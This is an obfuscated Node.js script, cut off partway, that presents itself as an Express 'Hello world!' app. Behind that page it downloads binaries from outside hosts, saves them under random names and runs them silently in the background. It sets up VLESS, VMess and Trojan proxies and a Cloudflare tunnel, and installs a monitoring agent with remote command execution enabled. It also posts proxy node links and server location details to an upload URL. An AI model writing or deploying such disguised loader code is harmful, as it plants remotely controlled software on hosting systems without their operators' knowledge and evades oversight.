const _0x5c8937=_0x2263;(function(_0x11385f,_0x13baf1){const _0x243882={_0x1ce3be:0x289,_0x1d10a5:0x274,_0x293372:0x207,_0xc2547c:0x243},_0x5a96e9=_0x2263,_0x5cd8c9=_0x11385f();while(!![]){try{const _0x6d6132=parseInt(_0x5a96e9(0x208))/0x1*(-parseInt(_0x5a96e9(_0x243882._0x1ce3be))/0x2)+-parseInt(_0x5a96e9(_0x243882._0x1d10a5))/0x3+-parseInt(_0x5a96e9(0x224))/0x4*(-parseInt(_0x5a96e9(0x225))/0x5)+parseInt(_0x5a96e9(_0x243882._0x293372))/0x6*(-parseInt(_0x5a96e9(_0x243882._0xc2547c))/0x7)+parseInt(_0x5a96e9(0x23c))/0x8*(parseInt(_0x5a96e9(0x296))/0x9)+parseInt(_0x5a96e9(0x2b7))/0xa*(-parseInt(_0x5a96e9(0x244))/0xb)+parseInt(_0x5a96e9(0x248))/0xc;if(_0x6d6132===_0x13baf1)break;else _0x5cd8c9['push'](_0x5cd8c9['shift']());}catch(_0x5e6c1a){_0x5cd8c9['push'](_0x5cd8c9['shift']());}}}(_0x62f0,0x416b1));const express=require(_0x5c8937(0x26c)),app=express(),axios=require(_0x5c8937(0x283)),os=require('os'),fs=require('fs'),path=require(_0x5c8937(0x1ff)),{promisify}=require(_0x5c8937(0x28d)),exec=promisify(require(_0x5c8937(0x260))[_0x5c8937(0x28e)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x5c8937(0x29d)][_0x5c8937(0x2aa)]||'',PROJECT_URL=process['env'][_0x5c8937(0x20b)]||'',AUTO_ACCESS=process[_0x5c8937(0x29d)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x5c8937(0x29d)][_0x5c8937(0x247)]||_0x5c8937(0x245),SUB_PATH=process['env'][_0x5c8937(0x265)]||_0x5c8937(0x286),PORT=process[_0x5c8937(0x29d)][_0x5c8937(0x293)]||process[_0x5c8937(0x29d)][_0x5c8937(0x246)]||0xbb8,UUID=process[_0x5c8937(0x29d)][_0x5c8937(0x2a3)]||_0x5c8937(0x1f3),NEZHA_SERVER=process[_0x5c8937(0x29d)][_0x5c8937(0x239)]||'',NEZHA_PORT=process[_0x5c8937(0x29d)][_0x5c8937(0x23d)]||'',NEZHA_KEY=process[_0x5c8937(0x29d)][_0x5c8937(0x26a)]||'',ARGO_DOMAIN=process[_0x5c8937(0x29d)][_0x5c8937(0x2b9)]||'',ARGO_AUTH=process[_0x5c8937(0x29d)][_0x5c8937(0x1f0)]||'',ARGO_PORT=process[_0x5c8937(0x29d)]['ARGO_PORT']||0x1f41,CFIP=process[_0x5c8937(0x29d)][_0x5c8937(0x2ad)]||_0x5c8937(0x1f2),CFPORT=process[_0x5c8937(0x29d)]['CFPORT']||0x1bb,NAME=process[_0x5c8937(0x29d)][_0x5c8937(0x2ba)]||'';!fs[_0x5c8937(0x280)](FILE_PATH)?(fs[_0x5c8937(0x2b0)](FILE_PATH),console[_0x5c8937(0x1fe)](FILE_PATH+_0x5c8937(0x253))):console[_0x5c8937(0x1fe)](FILE_PATH+_0x5c8937(0x21a));function _0x62f0(){const _0x4d3393=['taskkill\x20/f\x20/im\x20','vmess','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0avless://','\x20-c\x20','length','utf-8','\x20already\x20exists','catch','TunnelSecret','https://oooo.serv00.net/add-url','NEZHA\x20variable\x20is\x20empty,skip\x20running','false','443','https://amd64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/bot','/sub.txt\x20saved\x20successfully','112FMnHQI','3495gsPHAV','2083','blackhole','/trojan-argo','127.0.0.1','pkill\x20-f\x20\x22[','base64','set','Error\x20downloading\x20files:','rm\x20-rf\x20','match','application/json','toString','unlinkSync','send','fileName','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20\x20\x20','tcp','--tls','NEZHA_SERVER','vless','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','29384xhkVQc','NEZHA_PORT','error','unlink','sub.txt','\x20-c\x20\x22','\x0a\x0atrojan://','6524YLKEoT','537229uBzoKF','./tmp','PORT','FILE_PATH','10992840cnPlQR','\x20-s\x20','pipe','includes','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Error\x20reading\x20boot.log:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','.exe\x20>\x20nul\x202>&1','tls','?encryption=none&security=tls&sni=','Unhandled\x20error\x20in\x20startserver:','\x20is\x20created','Download\x20','get','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','from','tunnel.json','push','/dev/null','/api/add-nodes','automatic\x20access\x20task\x20added\x20successfully','del\x20/f\x20/q\x20','Empowerment\x20success\x20for\x20','tunnel.yml','child_process','/vmess-argo?ed=2560','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20tunnel:\x20','\x20>/dev/null\x202>&1\x20&','SUB_PATH','charAt','&path=%2Fvless-argo%3Fed%3D2560#','firefox','test','NEZHA_KEY','8443','express','arm','http\x20server\x20is\x20running\x20on\x20port:','\x20is\x20running','web\x20running\x20error:\x20','https://ipapi.co/json/','/api/delete-nodes','/vmess-argo','113193aMogWb','npm\x20running\x20error:\x20','\x20successfully','fileUrl','chmod','App\x20is\x20running','config.yaml','unshift','Add\x20automatic\x20access\x20task\x20faild:\x20','data','trojan','\x20-p\x20','existsSync','https://amd64.ssss.nyc.mn/v1','/api/add-subscriptions','axios','countryCode','Error\x20in\x20startserver:','sub','clear','\x20failed:\x20','694nJdZMJ','listen','block','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','util','exec','filter','list.txt','readFileSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','SERVER_PORT','http','Empowerment\x20failed\x20for\x20','432TasPkI','writeFileSync','/config.json\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/web','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','createWriteStream','true','env','success','Subscription\x20uploaded\x20successfully','https://amd64.ssss.nyc.mn/web','ARGO_DOMAIN:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','UUID','/vless-argo','forEach','post','none','finish','status','UPLOAD_URL','quic','&fp=firefox&type=ws&host=','CFIP','Hello\x20world!','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','mkdirSync','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','win32','then','has','random','nohup\x20','40VkTfcU','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','ARGO_DOMAIN','NAME','platform','split','ARGO_AUTH','config.json','cdns.doon.eu.org','cde2c3c4-5045-4cfa-a814-12974ccfba2c','country_code','join','?security=tls&sni=','ArgoDomain:','2053','basename','arch','Content-Type','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','org','log','path','freedom','pop','http://ip-api.com/json/','isFile','\x20>/dev/null\x202>&1','Unknown','amd','2874PyGfMR','474Ocnvrr','aarch64','stringify','PROJECT_URL','floor','boot.log','message','2087','xtls-rprx-vision','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/v1'];_0x62f0=function(){return _0x4d3393;};return _0x62f0();}function generateRandomName(){const _0x36e90f={_0x313aaf:0x20c},_0x29098c=_0x5c8937,_0x116f19='abcdefghijklmnopqrstuvwxyz';let _0x1a999d='';for(let _0x3bf3dc=0x0;_0x3bf3dc<0x6;_0x3bf3dc++){_0x1a999d+=_0x116f19['charAt'](Math[_0x29098c(_0x36e90f._0x313aaf)](Math[_0x29098c(0x2b5)]()*_0x116f19['length']));}return _0x1a999d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5c8937(0x1f5)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x5c8937(0x1f5)](FILE_PATH,webName),botPath=path[_0x5c8937(0x1f5)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x5c8937(0x240)),listPath=path[_0x5c8937(0x1f5)](FILE_PATH,_0x5c8937(0x290)),bootLogPath=path[_0x5c8937(0x1f5)](FILE_PATH,_0x5c8937(0x20d)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x5a7d4e={_0xfd1a4e:0x219,_0x2d415c:0x231,_0x25e624:0x28f,_0x3b5fb9:0x218},_0x13c590=_0x5c8937;try{if(!UPLOAD_URL)return;if(!fs[_0x13c590(0x280)](subPath))return;let _0x2ead0d;try{_0x2ead0d=fs['readFileSync'](subPath,_0x13c590(_0x5a7d4e._0xfd1a4e));}catch{return null;}const _0x47a624=Buffer['from'](_0x2ead0d,_0x13c590(0x22b))[_0x13c590(_0x5a7d4e._0x2d415c)]('utf-8'),_0x52d045=_0x47a624[_0x13c590(0x1ef)]('\x0a')[_0x13c590(_0x5a7d4e._0x25e624)](_0x3867ad=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3867ad));if(_0x52d045[_0x13c590(_0x5a7d4e._0x3b5fb9)]===0x0)return;return axios[_0x13c590(0x2a6)](UPLOAD_URL+_0x13c590(0x272),JSON[_0x13c590(0x20a)]({'nodes':_0x52d045}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x2923f8=>{return null;}),null;}catch(_0x20a446){return null;}}function cleanupOldFiles(){const _0x3ebf74={_0x126624:0x2a5},_0x3fb272={_0x4b1e6d:0x1f5,_0x4cfc49:0x232},_0xdc5a19=_0x5c8937;try{const _0x41fd7a=fs['readdirSync'](FILE_PATH);_0x41fd7a[_0xdc5a19(_0x3ebf74._0x126624)](_0x47371a=>{const _0x3209de=_0xdc5a19,_0x1ed219=path[_0x3209de(_0x3fb272._0x4b1e6d)](FILE_PATH,_0x47371a);try{const _0x265cce=fs['statSync'](_0x1ed219);_0x265cce[_0x3209de(0x203)]()&&fs[_0x3209de(_0x3fb272._0x4cfc49)](_0x1ed219);}catch(_0x737ca7){}});}catch(_0x3bcad1){}}function _0x2263(_0x1b68a3,_0x5452e4){const _0x62f00e=_0x62f0();return _0x2263=function(_0x22638b,_0x22698d){_0x22638b=_0x22638b-0x1ee;let _0xa03fe7=_0x62f00e[_0x22638b];return _0xa03fe7;},_0x2263(_0x1b68a3,_0x5452e4);}app['get']('/',function(_0x280b18,_0x12a707){const _0x3ffa6a={_0x4642ad:0x233,_0x598e1a:0x2ae},_0x31e785=_0x5c8937;_0x12a707[_0x31e785(_0x3ffa6a._0x4642ad)](_0x31e785(_0x3ffa6a._0x598e1a));});async function generateConfig(){const _0xb5179b={_0x34cf31:0x23a,_0x46ad4c:0x210,_0x4b12c4:0x2a7,_0x5c0b8f:0x2a4,_0x11cc99:0x228,_0x102aff:0x229,_0x5c01e6:0x237,_0x12ce32:0x229,_0x55b73e:0x294,_0xc0445f:0x2ab,_0x5b3356:0x27e,_0x28f32a:0x228,_0x3983c3:0x28b,_0x49c7e2:0x297,_0x507ad2:0x1f1,_0xc42592:0x20a},_0x305ebb=_0x5c8937,_0x400891={'log':{'access':_0x305ebb(0x25a),'error':_0x305ebb(0x25a),'loglevel':_0x305ebb(0x2a7)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x305ebb(_0xb5179b._0x34cf31),'settings':{'clients':[{'id':UUID,'flow':_0x305ebb(_0xb5179b._0x46ad4c)}],'decryption':_0x305ebb(_0xb5179b._0x4b12c4),'fallbacks':[{'dest':0xbb9},{'path':_0x305ebb(_0xb5179b._0x5c0b8f),'dest':0xbba},{'path':_0x305ebb(0x273),'dest':0xbbb},{'path':_0x305ebb(_0xb5179b._0x11cc99),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x305ebb(_0xb5179b._0x102aff),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x305ebb(0x2a7)},'streamSettings':{'network':_0x305ebb(_0xb5179b._0x5c01e6),'security':_0x305ebb(0x2a7)}},{'port':0xbba,'listen':_0x305ebb(_0xb5179b._0x12ce32),'protocol':_0x305ebb(0x23a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x305ebb(_0xb5179b._0x4b12c4)},'streamSettings':{'network':'ws','security':_0x305ebb(0x2a7),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x305ebb(_0xb5179b._0x55b73e),_0x305ebb(0x250),_0x305ebb(0x2ab)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x305ebb(_0xb5179b._0x102aff),'protocol':_0x305ebb(0x214),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x305ebb(0x273)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x305ebb(0x250),_0x305ebb(_0xb5179b._0xc0445f)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x305ebb(_0xb5179b._0x5b3356),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x305ebb(0x2a7),'wsSettings':{'path':_0x305ebb(_0xb5179b._0x28f32a)}},'sniffing':{'enabled':!![],'destOverride':[_0x305ebb(0x294),_0x305ebb(0x250),_0x305ebb(0x2ab)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x305ebb(0x200),'tag':'direct'},{'protocol':_0x305ebb(0x227),'tag':_0x305ebb(_0xb5179b._0x3983c3)}]};fs[_0x305ebb(_0xb5179b._0x49c7e2)](path[_0x305ebb(0x1f5)](FILE_PATH,_0x305ebb(_0xb5179b._0x507ad2)),JSON[_0x305ebb(_0xb5179b._0xc42592)](_0x400891,null,0x2));}function getSystemArchitecture(){const _0x3b220e={_0xa93f92:0x1fa,_0x4ec531:0x209,_0x54d1f0:0x206},_0x301168=_0x5c8937,_0x4297bc=os[_0x301168(_0x3b220e._0xa93f92)]();return _0x4297bc==='arm'||_0x4297bc==='arm64'||_0x4297bc===_0x301168(_0x3b220e._0x4ec531)?'arm':_0x301168(_0x3b220e._0x54d1f0);}function downloadFile(_0x33bb9e,_0x549058,_0x54d35e){const _0x47ab3c={_0x4b2a9:0x29b},_0x208374={_0x22cf11:0x27d,_0x26b4e4:0x2a8},_0x3292f2={_0x387c2d:0x254,_0x10010c:0x276},_0x132183=_0x5c8937,_0xd543c=_0x33bb9e;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x1ba229=fs[_0x132183(_0x47ab3c._0x4b2a9)](_0xd543c);axios({'method':'get','url':_0x549058,'responseType':'stream'})[_0x132183(0x2b3)](_0x328629=>{const _0x553602=_0x132183;_0x328629[_0x553602(_0x208374._0x22cf11)][_0x553602(0x24a)](_0x1ba229),_0x1ba229['on'](_0x553602(_0x208374._0x26b4e4),()=>{const _0x5dadd2=_0x553602;_0x1ba229['close'](),console['log'](_0x5dadd2(_0x3292f2._0x387c2d)+path['basename'](_0xd543c)+_0x5dadd2(_0x3292f2._0x10010c)),_0x54d35e(null,_0xd543c);}),_0x1ba229['on'](_0x553602(0x23e),_0x5cf3fb=>{const _0x616f92=_0x553602;fs[_0x616f92(0x23f)](_0xd543c,()=>{});const _0x549e37=_0x616f92(0x254)+path[_0x616f92(0x1f9)](_0xd543c)+'\x20failed:\x20'+_0x5cf3fb[_0x616f92(0x20e)];console[_0x616f92(0x23e)](_0x549e37),_0x54d35e(_0x549e37);});})[_0x132183(0x21b)](_0x298e44=>{const _0x385763=_0x132183,_0x4a2e09='Download\x20'+path['basename'](_0xd543c)+_0x385763(0x288)+_0x298e44[_0x385763(0x20e)];console[_0x385763(0x23e)](_0x4a2e09),_0x54d35e(_0x4a2e09);});}async function downloadFilesAndRun(){const _0x23df85={_0x1a869b:0x218,_0x4e3375:0x1fc,_0x5e6a16:0x220,_0x2ab6d4:0x26b,_0x4527da:0x1f8,_0x1356ff:0x2b4,_0x5a4acc:0x29c,_0x34fad0:0x21f,_0x22a8e6:0x2a2,_0x413c8d:0x23b,_0x42c62d:0x29a,_0x58f9b3:0x297,_0x1b95c8:0x1f5,_0x2dbf08:0x27a,_0x48ce20:0x241,_0x1f81e4:0x1fe,_0x4074d4:0x220,_0x161513:0x20f,_0xf2a121:0x226,_0x553d15:0x24e,_0x37f288:0x23e,_0x5803ad:0x21e,_0x591437:0x2b6,_0x48ffc4:0x298,_0x4d85da:0x270,_0x30c96b:0x280,_0x330274:0x28c,_0x4873c5:0x2b6},_0xbcdbb7={_0x339e53:0x2a5},_0x1d9a96={_0x2d0e64:0x280},_0x109de6=_0x5c8937,_0x478415=getSystemArchitecture(),_0x5a0113=getFilesForArchitecture(_0x478415);if(_0x5a0113[_0x109de6(_0x23df85._0x1a869b)]===0x0){console['log'](_0x109de6(_0x23df85._0x4e3375));return;}const _0x508cd8=_0x5a0113['map'](_0xb029a3=>{const _0x59a138={_0x2c0e55:0x234,_0x380405:0x277};return new Promise((_0x51f263,_0x346774)=>{const _0x3ccf74=_0x2263;downloadFile(_0xb029a3[_0x3ccf74(_0x59a138._0x2c0e55)],_0xb029a3[_0x3ccf74(_0x59a138._0x380405)],(_0x5f5414,_0x227e3f)=>{_0x5f5414?_0x346774(_0x5f5414):_0x51f263(_0x227e3f);});});});try{await Promise['all'](_0x508cd8);}catch(_0x6e9487){console[_0x109de6(0x23e)](_0x109de6(0x22d),_0x6e9487);return;}function _0x5f077b(_0x4683a1){const _0x40ed1d=_0x109de6,_0x5dd4b8=0x1fd;_0x4683a1[_0x40ed1d(_0xbcdbb7._0x339e53)](_0x458bd7=>{const _0x291d77={_0x2f2325:0x25e},_0x557893=_0x40ed1d;fs[_0x557893(_0x1d9a96._0x2d0e64)](_0x458bd7)&&fs[_0x557893(0x278)](_0x458bd7,_0x5dd4b8,_0x43ad0d=>{const _0x14330b=_0x557893;_0x43ad0d?console['error'](_0x14330b(0x295)+_0x458bd7+':\x20'+_0x43ad0d):console[_0x14330b(0x1fe)](_0x14330b(_0x291d77._0x2f2325)+_0x458bd7+':\x20'+_0x5dd4b8[_0x14330b(0x231)](0x8));});});}const _0x5235be=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5f077b(_0x5235be);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1aa7ec=NEZHA_SERVER[_0x109de6(0x24b)](':')?NEZHA_SERVER[_0x109de6(0x1ef)](':')[_0x109de6(0x201)]():'',_0xc5601c=new Set([_0x109de6(_0x23df85._0x5e6a16),_0x109de6(_0x23df85._0x2ab6d4),'2096',_0x109de6(0x20f),_0x109de6(0x226),_0x109de6(_0x23df85._0x4527da)]),_0x1454c1=_0xc5601c[_0x109de6(_0x23df85._0x1356ff)](_0x1aa7ec)?_0x109de6(_0x23df85._0x5a4acc):_0x109de6(_0x23df85._0x34fad0),_0x4e9cfc='\x0aclient_secret:\x20'+NEZHA_KEY+_0x109de6(_0x23df85._0x22a8e6)+NEZHA_SERVER+_0x109de6(_0x23df85._0x413c8d)+_0x1454c1+_0x109de6(_0x23df85._0x42c62d)+UUID;fs[_0x109de6(_0x23df85._0x58f9b3)](path[_0x109de6(_0x23df85._0x1b95c8)](FILE_PATH,_0x109de6(_0x23df85._0x2dbf08)),_0x4e9cfc);const _0x139e6a=_0x109de6(0x2b6)+phpPath+_0x109de6(_0x23df85._0x48ce20)+FILE_PATH+_0x109de6(0x24c);try{await exec(_0x139e6a),console[_0x109de6(_0x23df85._0x1f81e4)](phpName+_0x109de6(0x26f)),await new Promise(_0x581f85=>setTimeout(_0x581f85,0x3e8));}catch(_0x14fb25){console[_0x109de6(0x23e)]('php\x20running\x20error:\x20'+_0x14fb25);}}else{let _0x2be996='';const _0x136be3=[_0x109de6(_0x23df85._0x4074d4),_0x109de6(0x26b),'2096',_0x109de6(_0x23df85._0x161513),_0x109de6(_0x23df85._0xf2a121),_0x109de6(_0x23df85._0x4527da)];_0x136be3[_0x109de6(0x24b)](NEZHA_PORT)&&(_0x2be996=_0x109de6(0x238));const _0x5a5269='nohup\x20'+npmPath+_0x109de6(0x249)+NEZHA_SERVER+':'+NEZHA_PORT+_0x109de6(0x27f)+NEZHA_KEY+'\x20'+_0x2be996+_0x109de6(_0x23df85._0x553d15);try{await exec(_0x5a5269),console[_0x109de6(0x1fe)](npmName+_0x109de6(0x26f)),await new Promise(_0x216926=>setTimeout(_0x216926,0x3e8));}catch(_0x314a79){console[_0x109de6(_0x23df85._0x37f288)](_0x109de6(0x275)+_0x314a79);}}}else console['log'](_0x109de6(_0x23df85._0x5803ad));const _0x4687f3=_0x109de6(_0x23df85._0x591437)+webPath+_0x109de6(0x217)+FILE_PATH+_0x109de6(_0x23df85._0x48ffc4);try{await exec(_0x4687f3),console[_0x109de6(0x1fe)](webName+_0x109de6(0x26f)),await new Promise(_0x1174c7=>setTimeout(_0x1174c7,0x3e8));}catch(_0x5f3d1c){console[_0x109de6(0x23e)](_0x109de6(_0x23df85._0x4d85da)+_0x5f3d1c);}if(fs[_0x109de6(_0x23df85._0x30c96b)](botPath)){let _0x9b8a52;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x9b8a52='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x9b8a52=_0x109de6(0x292)+FILE_PATH+'/tunnel.yml\x20run':_0x9b8a52=_0x109de6(_0x23df85._0x330274)+FILE_PATH+_0x109de6(0x235)+ARGO_PORT;try{await exec(_0x109de6(_0x23df85._0x4873c5)+botPath+'\x20'+_0x9b8a52+_0x109de6(0x264)),console['log'](botName+_0x109de6(0x26f)),await new Promise(_0x48567c=>setTimeout(_0x48567c,0x7d0));}catch(_0x5ea617){console[_0x109de6(_0x23df85._0x37f288)]('Error\x20executing\x20command:\x20'+_0x5ea617);}}await new Promise(_0x49b1eb=>setTimeout(_0x49b1eb,0x1388));}function getFilesForArchitecture(_0x363022){const _0x38a411={_0x2ceac1:0x26d,_0x51f246:0x299,_0x2ede03:0x222,_0x5986e1:0x2a0,_0x3c3200:0x221,_0x5b7fce:0x212,_0x358754:0x281,_0x5e4496:0x27b},_0x54dc97=_0x5c8937;let _0x4f9816;_0x363022===_0x54dc97(_0x38a411._0x2ceac1)?_0x4f9816=[{'fileName':webPath,'fileUrl':_0x54dc97(_0x38a411._0x51f246)},{'fileName':botPath,'fileUrl':_0x54dc97(_0x38a411._0x2ede03)}]:_0x4f9816=[{'fileName':webPath,'fileUrl':_0x54dc97(_0x38a411._0x5986e1)},{'fileName':botPath,'fileUrl':_0x54dc97(_0x38a411._0x3c3200)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x289230=_0x363022===_0x54dc97(_0x38a411._0x2ceac1)?'https://arm64.ssss.nyc.mn/agent':_0x54dc97(0x262);_0x4f9816[_0x54dc97(0x27b)]({'fileName':npmPath,'fileUrl':_0x289230});}else{const _0x5061a2=_0x363022==='arm'?_0x54dc97(_0x38a411._0x5b7fce):_0x54dc97(_0x38a411._0x358754);_0x4f9816[_0x54dc97(_0x38a411._0x5e4496)]({'fileName':phpPath,'fileUrl':_0x5061a2});}}return _0x4f9816;}function argoType(){const _0x46a9bf={_0x571a86:0x2b1,_0x80f129:0x24b,_0x36c469:0x21c,_0x223746:0x258,_0x5f2eb7:0x215,_0xd0dcf8:0x211,_0x200cc4:0x297,_0x49ac22:0x1f5,_0x742a14:0x2af},_0x9f6ac7=_0x5c8937;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x9f6ac7(0x1fe)](_0x9f6ac7(_0x46a9bf._0x571a86));return;}if(ARGO_AUTH[_0x9f6ac7(_0x46a9bf._0x80f129)](_0x9f6ac7(_0x46a9bf._0x36c469))){fs[_0x9f6ac7(0x297)](path['join'](FILE_PATH,_0x9f6ac7(0x258)),ARGO_AUTH);const _0x5d54dc=_0x9f6ac7(0x263)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x9f6ac7(_0x46a9bf._0x223746))+_0x9f6ac7(_0x46a9bf._0x5f2eb7)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x9f6ac7(_0x46a9bf._0xd0dcf8);fs[_0x9f6ac7(_0x46a9bf._0x200cc4)](path[_0x9f6ac7(_0x46a9bf._0x49ac22)](FILE_PATH,_0x9f6ac7(0x25f)),_0x5d54dc);}else console[_0x9f6ac7(0x1fe)](_0x9f6ac7(_0x46a9bf._0x742a14));}async function extractDomains(){const _0x276132={_0x94727f:0x291,_0x502c4a:0x1f5,_0x33ce3b:0x219,_0x53f94a:0x1fe,_0x4c09d8:0x1f7,_0x186562:0x256,_0x351320:0x235,_0x8e5a27:0x1fe,_0x42ed00:0x24d},_0x55c854={_0x572fdb:0x255,_0x7d8db0:0x271,_0x592a41:0x27d,_0x1c39b5:0x1fd,_0x559576:0x27d,_0x48e136:0x1f4,_0x5a7e8f:0x27d,_0x4b3ba7:0x2a9,_0xe398b3:0x1fd,_0x141e44:0x284},_0x589813={_0x41ac22:0x1ee,_0x4902fd:0x213,_0x247ff6:0x22a},_0x41abf8=_0x5c8937;let _0x37d2d4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x37d2d4=ARGO_DOMAIN,console[_0x41abf8(0x1fe)](_0x41abf8(0x2a1),_0x37d2d4),await _0x2c37bc(_0x37d2d4);else try{const _0x2c7966=fs[_0x41abf8(_0x276132._0x94727f)](path[_0x41abf8(_0x276132._0x502c4a)](FILE_PATH,_0x41abf8(0x20d)),_0x41abf8(_0x276132._0x33ce3b)),_0x15baa5=_0x2c7966['split']('\x0a'),_0x85de21=[];_0x15baa5[_0x41abf8(0x2a5)](_0x399a43=>{const _0x218810=_0x41abf8,_0x1c686c=_0x399a43[_0x218810(0x22f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1c686c){const _0x5584f5=_0x1c686c[0x1];_0x85de21[_0x218810(0x259)](_0x5584f5);}});if(_0x85de21['length']>0x0)_0x37d2d4=_0x85de21[0x0],console[_0x41abf8(_0x276132._0x53f94a)](_0x41abf8(_0x276132._0x4c09d8),_0x37d2d4),await _0x2c37bc(_0x37d2d4);else{console[_0x41abf8(0x1fe)](_0x41abf8(_0x276132._0x186562)),fs['unlinkSync'](path[_0x41abf8(0x1f5)](FILE_PATH,_0x41abf8(0x20d)));async function _0x2aed41(){const _0x4ff99a=_0x41abf8;try{process[_0x4ff99a(_0x589813._0x41ac22)]===_0x4ff99a(0x2b2)?await exec(_0x4ff99a(_0x589813._0x4902fd)+botName+_0x4ff99a(0x24f)):await exec(_0x4ff99a(_0x589813._0x247ff6)+botName[_0x4ff99a(0x266)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x11c5c5){}}_0x2aed41(),await new Promise(_0x555b45=>setTimeout(_0x555b45,0xbb8));const _0x396588=_0x41abf8(0x28c)+FILE_PATH+_0x41abf8(_0x276132._0x351320)+ARGO_PORT;try{await exec(_0x41abf8(0x2b6)+botPath+'\x20'+_0x396588+'\x20>/dev/null\x202>&1\x20&'),console[_0x41abf8(_0x276132._0x8e5a27)](botName+_0x41abf8(0x26f)),await new Promise(_0x4afbc4=>setTimeout(_0x4afbc4,0xbb8)),await extractDomains();}catch(_0x5d7fe1){console['error']('Error\x20executing\x20command:\x20'+_0x5d7fe1);}}}catch(_0x1a953b){console[_0x41abf8(0x23e)](_0x41abf8(_0x276132._0x42ed00),_0x1a953b);}async function _0x3f2f3a(){const _0x121747=_0x41abf8;try{const _0x2b61f8=await axios[_0x121747(_0x55c854._0x572fdb)](_0x121747(_0x55c854._0x7d8db0),{'timeout':0xbb8});if(_0x2b61f8[_0x121747(_0x55c854._0x592a41)]&&_0x2b61f8['data']['country_code']&&_0x2b61f8[_0x121747(0x27d)][_0x121747(_0x55c854._0x1c39b5)])return _0x2b61f8[_0x121747(_0x55c854._0x559576)][_0x121747(_0x55c854._0x48e136)]+'_'+_0x2b61f8[_0x121747(_0x55c854._0x592a41)]['org'];}catch(_0x25a8b5){try{const _0x364265=await axios[_0x121747(0x255)](_0x121747(0x202),{'timeout':0xbb8});if(_0x364265[_0x121747(_0x55c854._0x559576)]&&_0x364265[_0x121747(_0x55c854._0x5a7e8f)][_0x121747(_0x55c854._0x4b3ba7)]===_0x121747(0x29e)&&_0x364265[_0x121747(0x27d)]['countryCode']&&_0x364265[_0x121747(0x27d)][_0x121747(_0x55c854._0xe398b3)])return _0x364265[_0x121747(0x27d)][_0x121747(_0x55c854._0x141e44)]+'_'+_0x364265[_0x121747(0x27d)]['org'];}catch(_0x352273){}}return _0x121747(0x205);}async function _0x2c37bc(_0x36494f){const 